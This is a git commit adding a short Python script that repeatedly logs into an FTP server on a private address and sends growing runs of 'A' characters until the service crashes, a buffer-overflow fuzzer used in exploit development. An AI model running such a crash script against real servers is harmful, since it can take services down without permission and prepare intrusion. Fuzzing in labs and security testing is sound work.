0344c6bd1734a998ba3f17dcf689eae3d3429f59
Yaga۶Lan <109000323+Sore-Bloody@users.noreply.github.com>
2022-11-04 00:55:58 +0100

    Add files via upload

---
+++ free.py
@@ -0,0 +1,23 @@
+import socket
+import time
+import sys
+buffer = 'A'*100
+while True:
+        try:
+               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+               s.connect(('192.168.1.43', 21))
+               s.recv(1024)
+               s.send('USER anonymous\r\n')
+               s.recv(1024)
+               s.send('PASS anonymous\r\n')
+               s.recv(1024)
+               s.send(buffer + '\r\n')
+               s.recv(1024)
+               s.send('QUIT\r\n')
+               s.close()
+               print("[*] Buffer sent : " + str(len(buffer)))
+               time.sleep(1)
+               buffer = buffer + 'A'*100
+        except:
+               print("[*] Fuzzing crashed at byte : " + str(len(buffer)))
+               sys.exit()
